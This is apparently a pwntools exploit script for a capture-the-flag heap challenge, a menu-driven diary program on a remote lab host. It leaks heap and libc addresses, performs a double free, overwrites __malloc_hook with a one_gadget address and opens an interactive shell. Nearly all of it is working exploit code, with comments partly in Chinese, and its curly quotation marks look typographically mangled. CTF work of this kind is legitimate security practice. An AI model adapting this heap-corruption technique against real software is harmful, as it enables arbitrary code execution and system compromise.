# coding:UTF-8
from pwn import *
context(os=’linux’,arch=’amd64′,log_level=’debug’)

Debug = 0

if Debug:
io=process(‘./pwn’)
else:
io=remote(’85c3e0fcae5e972af313488de60e8a5a.kr-lab.com’,58512)

def menu(choose):
io.recvuntil(‘Your choice:’)

io.sendline(str(choose))

def add(length,context):
io.recvuntil(‘Please enter the length of daily:’)

io.sendline(str(length))
io.recvuntil(‘Now you can write you daily\n’)

io.sendline(str(context))

def change(index,context):
io.recvuntil(‘Please enter the index of daily:’)

io.sendline(str(index))
io.recvuntil(‘Please enter the new daily\n’)

io.sendline(str(context))

def remove(index):
io.recvuntil(‘Please enter the index of daily:’)

io.sendline(str(index))
io.recvuntil(‘remove successful!!\n’)

def main():
menu(2)
add(16,’a’)
menu(2)
add(16,’b’)
menu(4)
remove(1)
menu(4)
remove(0)
menu(2)
add(16,”)
menu(1)
io.recvuntil(‘: ‘)
heap_addr=u64((io.recvuntil(‘==’)[0:-2]).ljust(8,’\x00′))-0xa
print ‘heap->addr:’+hex(heap_addr)
io.recv(timeout=0.1)
io.sendline(‘2’)
add(33,p64(0x10)+p64(heap_addr+0xE0)+p64(0x10)+p64(0x0000000000602088))
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(2)
add(0x31,”)
menu(2)
add(0x31,”)
menu(4)
remove(4)
menu(4)
remove(5)
menu(4)
remove((heap_addr+0x58-0x0000000000602068)/16)
# 这里完成double free
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(2)
add(0x21,”)
menu(4)
remove(1)
menu(4)
remove(4)
menu(3)

change(10,(p64(0x00000000006020D8).ljust(0x20,’\x00′)))
menu(2)
add(0x21,’abc’)
menu(2)
add(0x21,p64(0x00000000006020E0)+’\xff’+’\x00’*7+p64(0x0000000000601FC8)) # leak read
menu(1)
io.recvuntil(‘9 : ‘)
libc=u64((io.recv(6)).ljust(8,’\x00′))-0x00000000000F7250
io.recv(timeout=0.1)
print hex(libc)
# 控制index 8
# leak index 9
# leak libc
# 计算one_gadget
one_gadget=libc+0x45216
malloc_hook=libc+0x3C4B10
io.recv(timeout=0.1)
# 写入往malloc_hook写入one_gadget
io.sendline(‘3’)
io.recv()
io.sendline(‘8’)
io.recv()
io.sendline(‘\x09’+’\x00’*7+p64(malloc_hook))
io.recvuntil(‘Your choice:’)
io.sendline(‘3’)
io.recvuntil(‘Please enter the index of daily:’)
io.sendline(‘8’)
io.recvuntil(‘Please enter the new daily\n’)
io.sendline(p64(one_gadget))
io.recv(timeout=0.1)
pause()
io.sendline(‘2’)
io.recvuntil(‘Please enter the length of daily’)
io.sendline(’16’)
io.interactive()
#
main()